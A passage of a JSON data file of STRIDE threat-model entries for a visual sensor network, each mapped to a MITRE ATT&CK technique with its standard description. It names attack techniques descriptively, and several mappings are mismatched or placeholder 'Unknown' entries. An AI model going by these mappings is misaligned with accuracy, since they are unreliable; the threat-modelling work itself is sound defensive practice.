                {
                    "Assumption": "Privilege controls are weak or misconfigured.",
                    "Role": "Attacker",
                    "Condition": "IF the system does not enforce strict privilege checks."
                }
            ],
            "Potential Impact": "Complete control over system operations and potential unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerabilities",
                "system access",
                "administrative"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised device used to escalate privileges and execute unauthorized commands.",
            "Assumptions": [
                {
                    "Assumption": "Compromised device is not detected quickly.",
                    "Role": "Attacker",
                    "Condition": "IF monitoring is insufficient to detect rogue devices."
                },
                {
                    "Assumption": "System lacks robust access control policies.",
                    "Role": "Attacker",
                    "Condition": "IF there are gaps in the implementation of access controls."
                }
            ],
            "Potential Impact": "Unauthorized actions and potential manipulation of system and data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "device compromise",
                "command execution",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of vulnerable services to embed malicious code and gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable services are exposed to attackers.",
                    "Role": "Attacker",
                    "Condition": "IF the system runs services with known vulnerabilities."
                },
                {
                    "Assumption": "Security patches are not regularly applied.",
                    "Role": "Attacker",
                    "Condition": "IF the system maintenance is sporadic."
                }
            ],
            "Potential Impact": "Execution of unauthorized commands leading to system compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "service vulnerabilities",
                "malicious code",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains control of a visual sensor node by spoofing the node's identity to the central server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can observe network traffic",
                    "Role": "Attacker",
                    "Condition": "When nodes are communicating with the central server"
                },
                {
                    "Assumption": "The attacker can forge packets",
                    "Role": "Attacker",
                    "Condition": "When sending messages to the server"
                },
                {
                    "Assumption": "The central server does not use strong mutual authentication",
                    "Role": "System",
                    "Condition": "When authenticating sensor nodes"
                }
            ],
            "Potential Impact": "Unauthorized access to visual data, potential manipulation of data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity theft",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Use of malicious camera nodes configured to send data to unauthorized endpoints.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically access some nodes",
                    "Role": "Attacker",
                    "Condition": "When there are insufficient physical security measures"
                },
                {
                    "Assumption": "Nodes can be reconfigured locally",
                    "Role": "Attacker",
                    "Condition": "No firmware encryption or secure boot"
                },
                {
                    "Assumption": "VSN nodes communicate directly without secure channel",
                    "Role": "System",
                    "Condition": "When nodes are out of range of the secure network"
                }
            ],
            "Potential Impact": "Unauthorized data disclosure, loss of data integrity.",
            "MITRE ATT&CK Keywords": [
                "malicious hardware",
                "reconfiguration",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker injects fake images or videos into the visual data stream using a compromised identity.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to compromised node credentials",
                    "Role": "Attacker",
                    "Condition": "Through previous breach or weak passwords"
                },
                {
                    "Assumption": "The visual data packets are not encrypted",
                    "Role": "System",
                    "Condition": "Data transmitted over the network in plaintext"
                },
                {
                    "Assumption": "Weak input validation on the central server",
                    "Role": "System",
                    "Condition": "When processing visual data"
                }
            ],
            "Potential Impact": "Propagates false information, possible misinformed decisions.",
            "MITRE ATT&CK Keywords": [
                "data injection",
                "network attack",
                "fake data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters the visual data transmitted between camera nodes and central server.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic can be intercepted",
                    "Role": "Attacker",
                    "Condition": "When using insecure communication channels"
                },
                {
                    "Assumption": "Visual data is not encrypted",
                    "Role": "System",
                    "Condition": "Transmitted visual data not using end-to-end encryption"
                },
                {
                    "Assumption": "No integrity checks are performed on received data",
                    "Role": "System",
                    "Condition": "Data integrity verification is not implemented"
                }
            ],
            "Potential Impact": "Altered visual data, potential misrepresentation of monitoring, decision-making based on tampered data.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "man-in-the-middle",
                "interception"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Firmware of visual sensor nodes is tampered with to introduce malicious code.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has physical access to nodes",
                    "Role": "Attacker",
                    "Condition": "Nodes placed in unsecured locations"
                },
                {
                    "Assumption": "Firmware updates are not digitally signed",
                    "Role": "System",
                    "Condition": "Using plain unsigned firmware updates"
                },
                {
                    "Assumption": "Lack of secure boot mechanisms",
                    "Role": "System",
                    "Condition": "Nodes do not verify firmware integrity at startup"
                }
            ],
            "Potential Impact": "Persistent malware presence, unauthorized control over nodes.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "code injection",
                "persistent threat"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Configuration files on central server are altered to manipulate sensor network behavior.",
            "Assumptions": [
                {
                    "Assumption": "Attacker gains access to the central server",
                    "Role": "Attacker",
                    "Condition": "Exploiting a vulnerability or insider attack"
                },
                {
                    "Assumption": "Server lacks auditing of configuration changes",
                    "Role": "System",
                    "Condition": "No logging or monitoring of file changes"
                },
                {
                    "Assumption": "Configuration files are not stored securely",
                    "Role": "System",
                    "Condition": "Unprotected storage locations"
                }
            ],
            "Potential Impact": "Network behavior altered, potential loss of data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "configuration tampering",
                "server access",
                "file modification"
            ],
            "mitre_technique": {
                "name": "Plist File Modification",
                "description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application\u2019s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)",
                "id": "attack-pattern--7d20fff9-8751-404e-badd-ccd71bda0236",
                "technique_id": "T1647"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker alters logs on the central server to erase traces of unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can access log files",
                    "Role": "Attacker",
                    "Condition": "Via compromised credentials or vulnerabilities"
                },
                {
                    "Assumption": "Logs are not protected by proper access controls",
                    "Role": "System",
                    "Condition": "Log files not adequately secured"
                },
                {
                    "Assumption": "Monitoring and alerts on log changes are not implemented",
                    "Role": "System",
                    "Condition": "System does not actively monitor log changes"
                }
            ],
            "Potential Impact": "Unauthorized actions go undetected, difficulty in incident response.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "erase tracks",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker falsifies access records to conceal unauthorized access to the visual sensor network.",
            "Assumptions": [
                {
                    "Assumption": "Access records can be edited by users",
                    "Role": "Attacker",
                    "Condition": "Weak access controls on maintenance interface"
                },
                {
                    "Assumption": "No cryptographic protection for record integrity",
                    "Role": "System",
                    "Condition": "Records stored without integrity checks"
                },
                {
                    "Assumption": "Lack of multifactor authentication",
                    "Role": "System",
                    "Condition": "Access to records requires only simple authentication"
                }
            ],
            "Potential Impact": "False operational history, misguides further investigations.",
            "MITRE ATT&CK Keywords": [
                "record falsification",
                "access concealment",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes sensor activity logs to prevent detection after tampering with sensor nodes.",
            "Assumptions": [
                {
                    "Assumption": "Activity logs can be accessed and modified",
                    "Role": "Attacker",
                    "Condition": "Attacker has administrative privileges"
                },
                {
                    "Assumption": "Logs are not immutable",
                    "Role": "System",
                    "Condition": "Logs are stored without write-protection"
                },
                {
                    "Assumption": "No automatic backups of logs",
                    "Role": "System",
                    "Condition": "System does not automatically back up logs"
                }
            ],
            "Potential Impact": "Loss of historical data, difficulty in reconstruction of events.",
            "MITRE ATT&CK Keywords": [
                "log deletion",
                "tampering aftermath",
                "activity concealment"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Captured visual data is intercepted during transmission to the central server by an unauthorized party.",
            "Assumptions": [
                {
                    "Assumption": "Transmission occurs over insecure channels",
                    "Role": "System",
                    "Condition": "No encryption used for data in transit"
                },
                {
                    "Assumption": "Attacker has capability to intercept network traffic",
                    "Role": "Attacker",
                    "Condition": "Attacker is within network reach"
                },
                {
                    "Assumption": "Node and server do not validate communication endpoints",
                    "Role": "System",
                    "Condition": "Lack of endpoint authentication"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of visual data, potential privacy violations.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "sensitive information",
                "network eavesdropping"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the stored visual data due to weak access controls on the central server.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms in place",
                    "Role": "System",
                    "Condition": "Simple or shared passwords used"
                },
                {
                    "Assumption": "Stored data is not encrypted",
                    "Role": "System",
                    "Condition": "Data at rest not protected by encryption"
                },
                {
                    "Assumption": "Access controls do not adhere to least privilege principle",
                    "Role": "System",
                    "Condition": "Excessive access rights granted"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive visual data, potential data breach and privacy issues.",
            "MITRE ATT&CK Keywords": [
                "unauthorized access",
                "data breach",
                "weak authentication"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive configuration data of the sensor nodes (like IP addresses and credentials) is leaked.",
            "Assumptions": [
                {
                    "Assumption": "Configuration data stored without encryption",
                    "Role": "System",
                    "Condition": "Unencrypted storage of sensitive data"
                },
                {
                    "Assumption": "Attacker gains access to backup files",
                    "Role": "Attacker",
                    "Condition": "Backup files not securely stored or transmitted"
                },
                {
                    "Assumption": "System audit trails are not monitored",
                    "Role": "System",
                    "Condition": "Lack of monitoring for unusual access behaviors"
                }
            ],
            "Potential Impact": "Unauthorized access and control over the sensor network, potential network compromise.",
            "MITRE ATT&CK Keywords": [
                "sensitive configuration leak",
                "data exposure",
                "network compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the network with traffic to overwhelm the visual sensor nodes and disable them.",
            "Assumptions": [
                {
                    "Assumption": "Network has no rate limiting or traffic filtering",
                    "Role": "System",
                    "Condition": "No firewall or IDS/IPS in place"
                },
                {
                    "Assumption": "Attacker can send high volumes of traffic",
                    "Role": "Attacker",
                    "Condition": "Attacker has necessary resources to generate traffic"
                },
                {
                    "Assumption": "Nodes are configured to handle only normal traffic loads",
                    "Role": "System",
                    "Condition": "No load balancing or distributed setups"
                }
            ],
            "Potential Impact": "Disruption of visual data capture, potential gaps in monitoring.",
            "MITRE ATT&CK Keywords": [
                "network flooding",
                "service disruption",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: 